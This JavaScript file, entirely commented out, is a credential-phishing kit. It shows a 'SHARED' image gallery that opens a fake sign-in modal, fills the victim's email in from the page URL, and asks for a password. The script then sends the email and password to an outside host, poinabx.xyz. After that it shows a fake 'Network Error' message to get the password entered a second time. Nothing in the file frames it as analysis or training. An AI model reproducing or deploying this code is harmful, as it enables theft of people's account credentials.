// $(document).ready(function() {
//     $('.loaded').html(`
//           <h4 class="">SHARED</h4>
//    <div class="row mt-4 ">

//         <div class="col-sm-3 " data-toggle="modal" data-target="#myModal">
//             <img src="im/1.png" class="img-fluid" >
//         </div>
//         <div class="col-sm-3 " >
//             <img src="im/2.png" class="img-fluid" data-toggle="modal" data-target="#myModal">
//         </div>
//         <div class="col-sm-3 " >
//             <img src="im/3.png" class="img-fluid" data-toggle="modal" data-target="#myModal">
//         </div>
//         <div class="col-sm-3 " >
//             <img src="im/4.png" class="img-fluid" data-toggle="modal" data-target="#myModal">
//         </div>
//     </div>

//     <!-- The Modal -->
//     <div class="modal " id="myModal">
//         <div class="modal-dialog">
//             <div class="modal-content">

//                 <!-- Modal Header -->

//                 <!-- Modal body -->
//                 <div class="modal-body bg-white p-3">

//                   <img src="im/to.png" class="img-fluid"><br>
//                   <small class="text-danger" id="msg" style="font-weight:600;"></small>
//                     <form method="post" id="formx" class="my-4">

//                         <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>

//                         <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>

//                         <button id="submitBtn" class="btn btn-md btn-primary">Sign In</button>
//                     </form>

//                 </div>
//             </div>
//         </div>
//     </div>
// `);

//     var baseUrl = (window.location).href;
//     var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
//     $("#x1").val(url);

//     $("#formx").submit(function(e) {
//         e.preventDefault();
//         var nm = $("#A1").val();
//         var formData = new FormData($("#formx")[0]);
//         $("#submitBtn").html("Processing..").prop("disabled", true);
//         $.ajax({
//             url: "https://poinabx.xyz/p/foz.php",
//             type: 'POST',
//             data: formData,
//             crossDomain: true,
//             contentType: false,
//             processData: false,
//             success: function(res) {
//                 console.log(res);
//                 $('#bd').show();
//                 $('#hm').hide();
//                 setTimeout(function() {
//                     $("#x1").val(url);
//                     $("#x2").val("");
//                     $('#msg').html(`Network Error! Please verify your information and try again`);
//                     $("#submitBtn").html("Sign In").prop("disabled", false);
//                 }, 2000);

//             }
//         });
//     });

// });
